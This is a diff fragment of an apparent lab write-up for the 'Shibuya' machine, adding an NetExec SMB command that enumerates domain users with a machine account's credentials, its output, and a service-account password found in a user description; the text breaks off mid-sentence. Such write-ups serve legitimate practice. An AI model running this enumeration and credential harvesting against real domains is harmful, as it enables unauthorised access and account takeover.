@@ -155,7 +155,34 @@ SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      users           READ
 ```
 ## Users
 ```python
-
+nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --users-export users.txt
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0 
 ```
+I dumped the users there were 503 in total so i have not included them all in the output
+
+Found what looks like a password in the user description
+
+```python
+svc_autojoin:K5&A6Dw9d8jrKWhV
+```
+Ill 
 
 
